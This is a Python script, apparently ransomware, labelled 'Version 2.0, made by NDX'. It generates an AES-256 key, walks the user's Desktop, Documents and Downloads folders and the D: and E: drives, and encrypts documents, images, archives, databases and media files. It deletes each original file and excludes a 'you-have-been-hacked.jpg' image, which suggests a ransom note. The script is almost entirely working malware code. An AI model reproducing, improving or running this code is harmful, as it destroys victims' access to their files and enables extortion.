import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import binascii

# Version 2.0
# Made by NDX

# Step 1: Generate a random AES key (256 bits = 32 bytes for AES-256)
def generate_aes_key():
    key = get_random_bytes(32)  # AES-256 uses a 32-byte (256-bit) key
    return key

# Step 2: Encrypt the file contents using the AES key
def aes_encrypt_file(key, input_file, output_file):
    cipher = AES.new(key, AES.MODE_CBC)  # Using CBC (Cipher Block Chaining) mode
    iv = cipher.iv  # Initialization Vector is needed for decryption

    with open(input_file, 'rb') as f_in:
        plaintext = f_in.read()
    
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))  # Pad the plaintext and encrypt

    # Write the IV and ciphertext to the output file
    with open(output_file, 'wb') as f_out:
        f_out.write(iv)  # Write the IV at the beginning of the file
        f_out.write(ciphertext)

    # Step 4: Delete the original file after encryption
    os.remove(input_file)  # This will delete the original file

# Step 3: Decrypt the file contents using the AES key
def aes_decrypt_file(key, input_file, output_file):
    with open(input_file, 'rb') as f_in:
        iv = f_in.read(16)  # Read the IV (first 16 bytes)
        ciphertext = f_in.read()  # Read the rest of the file (the ciphertext)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_text = unpad(cipher.decrypt(ciphertext), AES.block_size)  # Decrypt and unpad
    
    # Write the decrypted data to the output file
    with open(output_file, 'wb') as f_out:
        f_out.write(decrypted_text)

# File types to encrypt
file_types_to_encrypt = (
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
    '.txt', '.rtf',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.db', '.sql', '.mdb',
    '.php', '.html', '.js', '.css',
    '.mp3', '.mp4', '.avi', '.mkv', '.wav'
)

# Directories to encrypt
directories_to_encrypt = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Downloads"),
    "D:\\",  # Additional drives, modify as needed
    "E:\\"
]

# File types to exclude
file_types_to_exclude = (
    '.exe', '.dll',
    '.py', '.bat', '.ps1'  # Exclude Python, Batch, and PowerShell scripts
)

# Specific file names to exclude from encryption
files_to_exclude = [
    'TienLuongThang10.docx',
    'you-have-been-hacked.jpg'
]

# Directories to exclude
directories_to_exclude = (
    os.path.join("C:\\Windows"),
    os.path.join("C:\\Program Files"),
)

# Encrypt all files in a folder
def encrypt_all_files_in_folder(key, folder_path):
    # Traverse all files in the directory
    for root, dirs, files in os.walk(folder_path):
        # Skip excluded directories
        if any(root.startswith(excluded) for excluded in directories_to_exclude):
            continue
        
        for filename in files:
            # Check if the filename is in the exclusion list
            if filename in files_to_exclude:
                print(f"Skipping excluded file: '{filename}'")
                continue
            
            # Check file extension for encryption
            if filename.lower().endswith(file_types_to_encrypt) and not filename.lower().endswith(file_types_to_exclude):
                input_file = os.path.join(root, filename)
                output_file = input_file + ".aes"  # Append ".aes" to the encrypted file
                print(f"Encrypting '{input_file}'...")
                aes_encrypt_file(key, input_file, output_file)
                print(f"File '{input_file}' encrypted to '{output_file}' and original file deleted.")

# Example usage
if __name__ == "__main__":
    # Step 1: Generate AES key
    key = generate_aes_key()

    # Save the AES key to a file
    key_file = 'aes_key.txt'
    with open(key_file, 'w') as f_key_out:
        f_key_out.write(binascii.hexlify(key).decode('utf-8'))
    
    print(f"AES key saved to '{key_file}'.")

    # Step 2: Encrypt specified directories
    for directory in directories_to_encrypt:
        print(f"Encrypting files in '{directory}'...")
        encrypt_all_files_in_folder(key, directory)
    
    print("Encryption process completed.")
